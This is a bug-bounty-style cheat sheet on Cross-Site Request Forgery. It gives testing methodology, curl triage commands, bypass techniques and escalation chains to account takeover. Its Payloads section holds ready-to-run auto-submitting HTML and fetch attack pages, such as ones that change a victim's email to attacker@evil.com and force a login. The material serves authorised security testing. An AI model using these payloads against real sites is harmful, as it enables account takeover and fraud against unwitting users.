# Cross-Site Request Forgery (CSRF)

> One-line summary: The victim's browser sends an authenticated state-changing request the user never intended — low alone, but email-change/password-change/2FA-disable CSRF chains to full account takeover and pays P2–P1.

## Overview

CSRF forces a victim's browser to issue a request to the target while the victim is authenticated, using ambient credentials (session cookie, Basic auth, client cert). It arises when the app trusts the browser's cookie jar as proof of intent and has no unpredictable value tied to the user's session in the request. The classic requirements: a security-relevant action, cookie-based session handling, no unpredictable parameters, and a server that cannot tell a forged request from a genuine one. Impact is entirely about the action: changing email/password → ATO, disabling 2FA, granting permissions, moving money, or writing data that another flow consumes. SameSite=Lax defaults and token checks killed many trivial cases, but legacy endpoints, GET-based state changes, JSON APIs that skip content-type checks, and SameSite=None flows still pay.

## Where to find it

- Account settings: email change, password change, disable 2FA, add backup email, change recovery phone, delete account.
- Money/business actions: transfers, coupon/credit redemption, checkout, subscription plan change, gift-card apply, withdrawal.
- Authorization: invite user, change role, add team member, create API key, enable sharing/public link, connect integration (webhooks, OAuth account linking).
- Admin surface: user management, feature flags, export data, bulk actions — privileged CSRF is the highest-paying variant.
- Endpoints with: no token at all, a token that is not validated, a token not bound to the session, a token validated only if present, or a static token in JS source.
- Session handling: cookies with `SameSite=None`, `SameSite` absent, GET requests that mutate state, and JSON APIs.

## Methodology

1. **Enumerate state-changing requests.** In Burp, filter the sitemap to POST/PUT/PATCH/DELETE and to any GET that visibly mutates (delete, save, toggle). Export the list of endpoints and their params.
2. **Strip the token and replay.** Remove the CSRF token param and resend the request with the victim's cookie. If the action succeeds → candidate. Then test variants: empty token, token from another user's session (cross-session reuse), a previous token after rotation, token sent in the wrong place (header vs body).
3. **Test provenance headers.** Replay with no `Origin`/`Referer`, then with `Origin: https://evil.com` and `Referer: https://evil.com/csrf.html`. If the server ignores them → no origin validation. True positive requires the state change to actually happen, not just a 200 (check the resulting state, don't trust the status code).
4. **Check the cookie's SameSite attribute.** `curl -sI https://target.com/login | grep -i 'set-cookie'`. `SameSite=None` → cross-site POST works. Missing/`Lax` → cross-site POST is blocked in Chrome/Firefox, but top-level GET navigations still send `Lax` cookies, so state-changing GETs remain exploitable.
5. **Build the auto-submitting PoC.** One HTML file that submits with zero clicks (see Payloads). Host it anywhere you control. Do not use a public paste that a third party can edit.
6. **Confirm with two accounts in a real browser.** Account A = victim (logged in), open the PoC from a different origin. Verify the change landed on A. Then verify in the browsers that matter: Chrome + Firefox (SameSite=Lax default) and Safari (different cookie partitioning). Severity often hinges on which browsers are affected.
7. **Prove the consequence, not the request.** The report needs the end of the chain: email changed → attacker completes password reset → attacker logs in as victim. Or 2FA disabled → login with username/password only. Capture every step.

## Payloads

```html
<!-- 1. Basic auto-submitting POST (the default PoC Burp generates) -->
<form action="https://target.com/account/email" method="POST" id="f">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('f').submit();</script>

<!-- 2. JSON body via fetch: text/plain is CORS-safelisted -> no preflight, request goes through -->
<script>
fetch('https://target.com/api/user/email', {
  method: 'POST',
  mode: 'no-cors',                        // we do not need to read the response
  credentials: 'include',                 // cookies sent when SameSite=None
  headers: {'Content-Type': 'text/plain'},// safelisted, avoids preflight
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>

<!-- 2b. multipart/form-data via fetch: also safelisted, no preflight -->
<script>
var fd = new FormData();
fd.append('email', 'attacker@evil.com');
fetch('https://target.com/api/user/email', {method: 'POST', credentials: 'include', body: fd});
</script>

<!-- 2c. Sandboxed iframe -> Origin: null, for validators that allowlist "null" -->
<iframe sandbox="allow-forms allow-scripts" srcdoc='<form action="https://target.com/account/email" method="POST" id="f"><input name="email" value="attacker@evil.com"></form><script>document.getElementById("f").submit()</script>'></iframe>

<!-- 3. Plain HTML form that produces a JSON-looking body (server must not verify content type) -->
<form action="https://target.com/api/user/email" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>

<!-- 4. State-changing GET (works even with SameSite=Lax: top-level GET navigation) -->
<img src="https://target.com/settings/toggle?feature=x&state=off" width="0" height="0">
<script>location = 'https://target.com/settings/change_email?email=attacker@evil.com';</script>

<!-- 5. Method override when only POST is allowed but the API expects PUT -->
<form action="https://target.com/api/user/email" method="POST">
  <input type="hidden" name="_method" value="PUT">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>

<!-- 6. Login CSRF: force the victim into the attacker's account -->
<form action="https://target.com/login" method="POST" id="f">
  <input type="hidden" name="username" value="attacker@evil.com">
  <input type="hidden" name="password" value="attackerpass123">
</form>
<script>document.getElementById('f').submit();</script>
```

```bash
# 1. Does the action succeed with no CSRF token, from a foreign Origin?
curl -s -i -b 'session=<victim-cookie>' -X POST https://target.com/account/email \
  --data 'email=attacker@evil.com' \
  -H 'Origin: https://evil.com' -H 'Referer: https://evil.com/csrf.html'

# 2. Cross-session token reuse: take account B's token, send with account A's cookie
curl -s -i -b 'session=<A-cookie>' -X POST https://target.com/account/email \
  --data 'email=attacker@evil.com&csrf=<token-from-account-B>'

# 3. Check SameSite / Secure / HttpOnly on the session cookie
curl -sI https://target.com/login | grep -i 'set-cookie'
```

## Bypasses & edge cases

- **Token not bound to the session:** grab a token from your own account, replay it with the victim's cookie. If it validates, the protection is decorative.
- **Token only checked when present:** omit the param entirely; many middlewares skip validation for missing fields.
- **Referer validation bypasses:** `Referer` is suppressed cross-origin by `rel="noreferrer"`, https→http downgrades, and some meta-referrer policies — servers that *allow missing Referer* are then open. If the check is a substring/regex match, host the PoC on `https://target.com.evil.com` or `https://evil.com/target.com`.
- **SameSite=Lax notes:** Lax still sends cookies on top-level GET navigations — state-changing GETs stay exploitable. Chrome also has the "Lax+POST" 2-minute window for *freshly set* cookies (<120s old), which turns a login-then-CSRF chain into a POST bypass.
- **SameSite=None:** requires `Secure`; if the target sets it (embedded checkout widgets, cross-site SSO), cross-site POST works. Look for these on SSO/payment journeys.
- **JSON APIs:** try `Content-Type: text/plain` or `application/x-www-form-urlencoded` (both preflight-free) and watch whether the backend still parses the body; many frameworks do not check content type.
- **CORS misconfiguration amplifying CSRF:** if `Access-Control-Allow-Origin` reflects arbitrary origins *with* `Access-Control-Allow-Credentials: true`, you can send a JSON `Content-Type` request with a custom header — effectively removing every CSRF obstacle. Test: `curl -s -D- -b 'session=x' -H 'Origin: https://evil.com' https://target.com/api/me | grep -i access-control`.
- **Double-submit cookie weakness:** if the token is only compared cookie-vs-body, check whether you can set the cookie for the target domain via a subdomain (cookie injection) or via a sibling app.
- **`Origin: null` acceptance:** sandboxed iframes and pages loaded from `data:`/`file:` send `Origin: null`; servers that allowlist `null` (or only validate non-null origins) can be hit with the sandboxed-iframe PoC (Payloads 2c).
- **Token leakage to third parties:** tokens embedded in URLs leak via `Referer` to analytics, CDNs, and external assets — a leaked token plus the victim's session cookie is a ready-made forged request.
- **Predictable tokens:** timestamps, `md5(email)`, `base64(userid)` — decode a few before writing them off.
- **Redirect chains:** if a token check exists only on the final endpoint, an open redirect on the same site (same-site Referer) can serve as the origin for the forged request. `307/308` redirects preserve method and body — sometimes useful to reshape a request the attacker cannot otherwise send.
- **Self-XSS + CSRF combo:** CSRF changes a setting (email, display name) to a stored payload, and the victim's own later visit triggers XSS where a strict CSP would otherwise block remote attacks.

## Tools

- **Burp Suite** — the workhorses: right-click any request → *Engagement tools → Generate CSRF PoC* (auto-builds the HTML, supports auto-submit); *CSRF Token Tracker* extension keeps tokens fresh while you replay; *Repeater* for the strip/replay matrix.
- **XSRFProbe** — automated token/action discovery: `xsrfprobe -u https://target.com/`
- **Local PoC hosting** — `python3 -m http.server 8080` and open `http://127.0.0.1:8080/csrf.html` in the attacker profile; loopback origins are fine and keep the PoC off the internet.
- **curl** — the three commands in Payloads cover 90% of manual triage.
- **Browser DevTools** — Application → Cookies to read `SameSite`/`Secure`/`HttpOnly` directly; Network tab to confirm the forged request actually carried the session cookie.
- **Two browser profiles (or one normal + one private window without clearing state)** — attacker page in profile 1, victim session in profile 2. This is the test that settles true vs false positive.

## Escalation & chaining

- **Email change → ATO (the money chain):** CSRF the email-change endpoint → trigger "forgot password" → the reset link goes to the attacker's inbox → log in as the victim. Document each hop.
- **2FA/recovery changes:** disable 2FA, change the recovery email/phone — same ATO, and it bypasses password requirements.
- **Secondary email add (Weblate-style):** CSRF adds the attacker's address as a secondary identity, enabling password reset without touching the primary.
- **OAuth/SSO account linking:** CSRF the "link my social account" endpoint with the attacker's provider account → login as victim via the linked identity.
- **Admin CSRF:** if any admin panel action lacks tokens (create user, change role, export PII, disable logging), one click from a logged-in admin is critical impact — screenshot the panel state before/after.
- **Login CSRF → data theft:** force the victim into the attacker's account; anything the victim then saves (payment card, address, documents) lands in the attacker's account.
- **CSRF → SSRF:** admin-only webhook/integration endpoints that fetch a URL, CSRF'd by an admin, produce server-side requests from inside the network.
- **Pair with XSS:** XSS bypasses every CSRF token — if you have XSS anywhere on the origin, re-evaluate every "protected" endpoint as token-free.

## Report notes

- Ready-to-run PoC: a single self-contained HTML file that needs zero clicks; include it inline in the report and attach it.
- Video (or an ordered screenshot sequence) of: victim logged in → PoC hosted on attacker origin opened → request observed with the session cookie → victim account state changed.
- Raw request/response before and after, including the exact cookie flags (`SameSite`, `Secure`) your testing browser sent.
- Browser + version matrix. State explicitly which engines are affected (e.g., "works in Chrome 132 and Safari 18 with `SameSite=None`; blocked in Firefox with default settings"). This is the difference between low and high.
- The full impact chain, not just the forged request — program triage frequently downgrades "CSRF on settings" unless the report shows the ATO end state.
- What a genuine fix looks like (per-session tokens, `Origin` validation, re-auth for sensitive actions) in one line — optional but helps validation.
- Confirm the program allows state-changing PoCs against accounts you control before firing the exploit; state in the report that both accounts were yours.

## References

- [PortSwigger Web Security Academy — CSRF](https://portswigger.net/web-security/csrf)
- [PortSwigger — Bypassing SameSite cookie restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)
- [OWASP — CSRF](https://owasp.org/www-community/attacks/csrf) / [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [HackTricks — CSRF](https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery)
- [Scott Helme — CSRF is dead](https://scotthelme.co.uk/csrf-is-dead/)
- [web.dev — SameSite cookies explained](https://web.dev/articles/samesite-cookies-explained)
- [HackerOne #7870 — Localize: Change user settings through CSRF](https://hackerone.com/reports/7870)
- [HackerOne #223367 — Weblate: CSRF changing full name / adding secondary email](https://hackerone.com/reports/223367)
- [InfoSec Writeups — Duplicate CSRF leads to $$$$ (self-XSS + CSRF chain)](https://infosecwriteups.com/duplicate-csrf-leads-to-26c1ddc71dc5)
